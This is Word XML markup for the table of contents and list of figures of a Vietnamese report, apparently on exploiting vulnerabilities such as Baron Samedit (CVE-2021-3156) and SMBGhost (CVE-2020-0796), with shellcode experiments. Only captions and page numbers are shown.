          <w:t>3.2.3 Tiến hành thực nghiệm</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277789 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>33</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E19CC57" w14:textId="724F3294"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90" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>KẾT LUẬN</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277790 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>40</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2EC0E4FF" w14:textId="02953BBE" w:rsidR="00746169" w:rsidRDefault="00746169" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277791" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>TÀI LIỆU THAM KHẢO</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277791 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>42</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="456C0FCF" w14:textId="391DD7BD" w:rsidR="00DB4846" w:rsidRPr="00EF61D2" w:rsidRDefault="00D94422" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00DB4846" w:rsidRPr="00EF61D2" w:rsidSect="00D22C9A">
          <w:footerReference w:type="even" r:id="rId9"/>
          <w:pgSz w:w="11906" w:h="16838" w:code="9"/>
          <w:pgMar w:top="1138" w:right="1138" w:bottom="1411" w:left="1699" w:header="850" w:footer="432" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="454"/>
          <w:docGrid w:type="lines" w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:p w14:paraId="574D65C6" w14:textId="70173C45" w:rsidR="00E7754F" w:rsidRDefault="00E7754F">
      <w:pPr>
        <w:spacing w:before="0" w:after="200" w:line="276" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0554A856" w14:textId="2BC8388F" w:rsidR="00A62A03" w:rsidRDefault="00251D11" w:rsidP="00F03259">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc87264853"/>
      <w:bookmarkStart w:id="3" w:name="_Toc185277761"/>
      <w:r>
        <w:t>DANH MỤC HÌNH VẼ</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="766AEDB0" w14:textId="38612498" w:rsidR="00EF61D2" w:rsidRDefault="00EF61D2">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Hình 1. " </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc183967939" w:history="1">
        <w:r w:rsidRPr="00B64797">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 1.  1 Shellcode</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc183967939 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="51A116BF" w14:textId="01C5A075" w:rsidR="00EF61D2" w:rsidRDefault="00EF61D2" w:rsidP="00EF61D2">
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F41A94" w14:textId="42722D3C" w:rsidR="00746169" w:rsidRDefault="00EF61D2">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Hình 2." </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc185277493" w:history="1">
        <w:r w:rsidR="00746169" w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 2. 1 CVE-2021-3156 (Baron Samedit)</w:t>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277493 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r w:rsidR="00746169">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4CAC72DC" w14:textId="0D5BED70"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494" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 2. 2 Lỗ hổng SMBGost CVE-2020-0796</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277494 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0EBF4CA0" w14:textId="5832CFB4"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495" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 3 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
            <w:noProof/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>SMB2 COMPRESSION_TRANSFORM_HEADER</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277495 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BEB3C69" w14:textId="58CD015E"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496" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 4 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>Disassembly được chú thích của Hàm Liên quan Phía Máy Chủ -1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277496 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6A798160" w14:textId="0A047958"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497" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 5 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
            <w:noProof/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>Disassembly được chú thích của Hàm Liên quan Phía Máy Chủ - 2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277497 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52653C08" w14:textId="4F046F64"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498" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 6 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
            <w:noProof/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>Disassembly được chú thích của Hàm Liên quan Phía Máy Khách - 1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277498 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10BCD7ED" w14:textId="530DF4AD"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499" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 7 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
            <w:noProof/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>SMB3 qua cổng 445.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277499 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="37B44A7B" w14:textId="5DB5422D"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500" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 8 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
            <w:noProof/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>SMB Compression Transform Header</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277500 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1A9A310B" w14:textId="70B3E512" w:rsidR="00746169" w:rsidRDefault="00746169">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5277501" w:history="1">
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t xml:space="preserve">Hình 2. 9 </w:t>
        </w:r>
        <w:r w:rsidRPr="00C46CDF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
            <w:noProof/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>Buffer Overflow</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277501 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="51BAB875" w14:textId="28583D1A" w:rsidR="00F2370F" w:rsidRDefault="00EF61D2" w:rsidP="00EF61D2">
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Hình 3." </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="03435492" w14:textId="692BADD2"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59" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 1 Máy Ubuntu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042059 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49102660" w14:textId="1510FC36"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0" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 2 Phiên bản Sudo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042060 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B9D19B5" w14:textId="5067DE97"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1" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 3 Chuỗi shellcode được trích xuất sau khi biên dịch assembly</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042061 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="24EFDD4B" w14:textId="41B764F6"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2" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 4 Mã thực thi chứa shellcode (shellcode.c)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
